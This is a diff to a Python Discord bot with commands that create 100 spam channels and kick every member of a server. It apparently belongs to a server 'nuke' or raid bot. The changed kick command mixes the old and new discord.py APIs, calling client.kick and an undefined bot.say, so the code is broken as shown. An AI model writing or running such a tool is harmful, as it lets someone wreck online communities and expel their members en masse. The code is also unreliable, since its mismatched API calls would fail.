@@ -33,15 +33,19 @@ async def invite(ctx):
 async def create(ctx):
      for i in range(100):
         await ctx.guild.create_text_channel("튀엣")
-        
-@client.command()
+
+@client.command(pass_context=True)
 async def kick(ctx):
-    await ctx.send("튀엣")
-    for member in ctx.guild.members:
-        await member.kick()
+    if ctx.message.author.server_permissions.administrator and ctx.message.server.me.server_permissions.kick_members:
+        for member in ctx.message.server.members:
+            if member != ctx.message.author and member != ctx.message.server.me:
+                await client.kick(member)
+        await bot.say('튀엣')
+    else:
+        await bot.say('헤으응')
         
 @client.command()
 async def cmd(ctx):
-    await ctx.send("> ```튀엣 \n ?cmd \n ?clean \n ?create \n ?invite \n ?kick```")
+    await ctx.send("튀엣 \n ?cmd \n ?clean \n ?create \n ?invite \n ?kick")
                    
 client.run(os.environ['token'])
